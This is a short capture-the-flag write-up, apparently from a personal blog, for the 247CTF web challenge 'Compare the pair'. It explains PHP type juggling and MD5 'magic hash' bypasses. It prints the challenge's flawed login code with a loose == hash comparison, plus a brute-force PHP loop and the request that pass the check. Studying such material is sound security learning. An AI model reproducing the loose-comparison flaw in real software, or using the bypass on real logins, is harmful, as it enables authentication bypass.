---
title: "247CTF - Compare the pair [ WEB ]"
date: 2022-02-27T18:33:12-05:00
draft: false
---

## __Description__

Can you identify a way to bypass our login logic? MD5 is supposed to be a one-way function right?

## __Solution__

We are given the following php code.

```php
<?php
  require_once('flag.php');
  $password_hash = "0e902564435691274142490923013038";
  $salt = "f789bbc328a3d1a3";
  if(isset($_GET['password']) && md5($salt . $_GET['password']) == $password_hash){
    echo $flag;
  }
  echo highlight_file(__FILE__, true);
?>
```

PHP has a feature called `type juggling` or `type coercion`. This means that during the comparison of variables of different types, PHP will first convert them to a common, comparable type. Let's see the relevance of this in our code.

Note that the variable `password_hash` starts with 0e and everything else is numbers (php magic hashes) so it is considered as a float. 

```php
$password_hash = "0e902564435691274142490923013038";
```

If we continue reading the code, we will notice that a loose comparison is being made:

```php
isset($_GET['password']) && md5($salt . $_GET['password']) == $password_hash
```

Let's see what this type of comparison is about according to https://techgeekgalaxy.com/.

```
In PHP, variables of different data types can be compared using the loose comparison operator which is two equal signs (==). If two operands of different types are compared using loose comparison then there is an attempt to convert one or both of the operands and then compare them. The result of the conditional after conversion of an operand can sometimes lead to bugs or security exploits.
```

Once we have understood what it is all about, let's move on to the exploitation phase. The goal is quite simple, find a string that when mixed with the salt creates an MD5 hash starting with 0e and all other digits.

```php
<?php
$salt = "f789bbc328a3d1a3";
$x = 1;
while (True){
    if (md5($salt . $x) == 0){
        echo $x;
        $x++;
    } else{
        $x++;
    }
}
?>
```

The only thing missing would be to enter and pass the output to the password parameter.

```
https://76df5ddee940a4a1.247ctf.com/?password=<Output>
```

Thanks to Maiky for helping me solve the challenge, link to her [blog](https://maikypedia.gitlab.io/posts/).

I hope you enjoyed it! :D